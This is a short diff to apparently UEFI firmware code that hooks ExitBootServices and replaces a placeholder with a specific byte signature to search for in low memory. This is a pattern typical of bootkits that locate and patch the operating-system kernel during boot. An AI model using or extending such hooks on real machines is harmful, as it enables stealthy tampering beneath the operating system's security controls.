@@ -97,7 +97,7 @@ static EFI_EXIT_BOOT_SERVICES OriginalExitBootServices = NULL;
 static EFI_STATUS EFIAPI HookedExitBootServices(EFI_HANDLE ImageHandle, UINTN MapKey) {
     gBS->ExitBootServices = OriginalExitBootServices;
     EFI_STATUS Status;
-    UINT8 Signature[] = { 0xDE, 0xAD, 0xBE, 0xEF };
+    UINT8 Signature[] = { 0x48, 0xB8, 0x77, 0xBE, 0x9F, 0x1A, 0x2F, 0xDD, 0x24, 0x06, 0x49, 0xF7, 0xE1 };
     UINTN SignatureSize = sizeof(Signature);
 
     Status = SearchMemorySignatureInFirst2GB(GlobalSystemTable, Signature, SignatureSize);
